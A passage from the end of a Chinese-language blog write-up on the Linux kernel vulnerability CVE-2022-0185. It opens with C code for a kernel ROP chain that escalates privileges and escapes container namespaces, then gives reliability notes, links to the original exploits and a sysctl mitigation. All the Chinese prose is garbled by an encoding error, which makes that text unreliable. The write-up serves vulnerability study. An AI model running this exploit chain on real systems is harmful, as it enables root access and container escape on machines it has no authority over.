  uint64_t *rop;
  *(uint64_t *)&buf[0x39] = pop_rsp;                           
  *(uint64_t *)&buf[0x00] = add_rsp_0xd0; 

  rop = (uint64_t *)&buf[0xD8];

  *rop++ = pop_rdi;
  *rop++ = 0;
  *rop++ = prepare_kernel_cred;
  *rop++ = mov_rdi_rax_pop_pop;
  *rop++ = 0xdeadbeef;
  *rop++ = 0xdeadbeef;
  *rop++ = commit_creds;
  *rop++ = pop_rdi;
  *rop++ = 1;
  *rop++ = find_task_by_vpid;
  *rop++ = mov_rdi_rax_pop_pop;
  *rop++ = 0xdeadbeef;
  *rop++ = 0xdeadbeef;
  *rop++ = pop_rsi;
  *rop++ = init_nsproxy;
  *rop++ = switch_task_namespaces;
  *rop++ = kpti_trampoline;
  *rop++ = 0xdeadbeef;
  *rop++ = 0xbaadf00d;
  *rop++ = (uint64_t)pwned;
  *rop++ = user_cs;
  *rop++ = user_rflags;
  *rop++ = user_sp & 0xffffffffffffff00;
  *rop++ = user_ss;
}
```

**ææƒæˆªå›¾**ï¼š

![2-succeed](/images/posts/CVE-2022-0185/2-succeed.png)

---

**æ³¨æ„**ï¼š5.7 ç‰ˆæœ¬ä»¥åçš„å†…æ ¸ä½¿å¾—å †åˆ©ç”¨æ›´ç¨³å®šäº†ã€‚å¦‚æœ freelist pointer åœ¨chunkçš„å¼€å¤´ï¼Œå †å–·æˆåŠŸç‡ä¸è¶…è¿‡50%ï¼Œä½†æ˜¯5.7ç‰ˆæœ¬ä»¥åå°† freelist pointer æŒªåˆ° chunkä¸­é—´ï¼ˆ [move the freelist pointer to the middle](https://lore.kernel.org/linux-mm/202003051624.AAAC9AECC@keescook/t/) ï¼‰ä»¥é¿å…å †æº¢å‡ºçš„å±å®³ï¼Œè¿™æ„å‘³ç€åªè¦å †æº¢å‡ºä¸ä¼šç ´åé‡è¦çš„æ•°æ®ç»“æ„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨4ké¡µä¸­æº¢å‡ºå¾ˆé•¿ä¹Ÿä¸ä¼šç ´åå †çŠ¶æ€ï¼ˆ`msg_msg`éœ€è¦æº¢å‡ºè¦†ç›–å‰0x30å­—èŠ‚ï¼‰ï¼Œä¾¿äºæ³„éœ²å†…å­˜å’Œå®ç°ä»»æ„å†™ã€‚

ä½œè€…å†™äº†ä¸¤ä¸ªexpï¼Œä¸€ä¸ªç”¨äºUbuntu 20.04 çš„ææƒâ€”â€”[exploit_fuse.c](https://github.com/Crusaders-of-Rust/CVE-2022-0185/)ï¼ˆ5.7ä»¥åç‰ˆæœ¬éƒ½å¾ˆå¥½åˆ©ç”¨ï¼Œ`-p`ææƒï¼‰ï¼Œä¸€ä¸ªç”¨äºgoogleçš„Kubernetsé›†ç¾¤çš„ [KCTFç¯å¢ƒ](https://google.github.io/kctf/vrp)â€”â€”[exploit_kctf.c](https://github.com/Crusaders-of-Rust/CVE-2022-0185/blob/master/exploit_kctf.c) ã€‚

**ä¸´æ—¶é˜²æŠ¤**ï¼šUbuntuä¸­å¯ä»¥ç¦ç”¨å‘½åç©ºé—´

```c
sysctl -w kernel.unprivileged_userns_clone=0
```

**PS**ï¼šä½œè€…çš„ç¬¬2ç§åˆ©ç”¨æ–¹æ³•ï¼Œéœ€è¦è§¦å‘æ¼æ´ä¸‰æ¬¡ï¼Œå¯èƒ½å¯¼è‡´å †å–·ä¸ç¨³å®šï¼Œç»“æœå‘ç°ææƒå¾ˆç¨³å®šã€‚å¯èƒ½æ˜¯ä½œè€…å…ˆç”³è¯·äº† 4096 ä¸ªä½äº kmalloc-4096 çš„ `msg_msg`ï¼Œç„¶åæ¯è§¦å‘ä¸€æ¬¡éƒ½ä¼šé‡Šæ”¾ä¸€éƒ¨åˆ† `msg_msg`â€”â€” è°ƒç”¨`stuff_4k(16)`ï¼Œåªèƒ½è¯´ä½œè€…å¤ªå‰å®³äº†ï¼Œè¿™ä¹ˆå°è¯•çš„è¯æˆ‘ä¼šå´©æºƒçš„ã€‚ã€‚ã€‚å¯ä»¥æ”¹è¿›ä¸€ä¸‹åªè§¦å‘ä¸¤æ¬¡æ¼æ´å®Œæˆææƒï¼Œä¸€æ¬¡æ³„éœ²å †åœ°å€ï¼Œä¸€æ¬¡ç”¨æ¥æ„é€ ä»»æ„é‡Šæ”¾ï¼Œæ„é€ ä¸¤å—é‡å çš„ 0x400 å †å—ï¼Œç”¨ SKBæ³„éœ²`pipe_buffer`ä¸­çš„å†…æ ¸åŸºåœ°å€ï¼Œç„¶ååˆ©ç”¨SKBå †å–·ä¼ªé€  `pipe_buffer` åŠ«æŒæ§åˆ¶æµã€‚

---

### å‚è€ƒ

[CVE-2022-0185: A Case Study](https://www.hackthebox.com/blog/CVE-2022-0185:_A_case_study)

[CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Google's KCTF Containers](https://www.willsroot.io/2022/01/cve-2022-0185.html)

FUSEåˆ©ç”¨æŠ€æœ¯ â€”â€” [slideshow](https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019 - Exploiting race conditions on Linux.pdf) / [FUSE technique](https://github.com/nrb547/kernel-exploitation/blob/main/cve-2021-32606/cve-2021-32606.md)

[[æ¼æ´åˆ†æ] CVE-2022-0185 linux å†…æ ¸ææƒ(é€ƒé€¸)](https://blog.csdn.net/Breeze_CAT/article/details/123007818?spm=1001.2014.3001.5502)

[CVE-2022-0185ï¼šLinux kernel bugå¯å®ç°Kuberneteså®¹å™¨é€ƒé€¸](https://www.076576.com/2022/02/3312.html)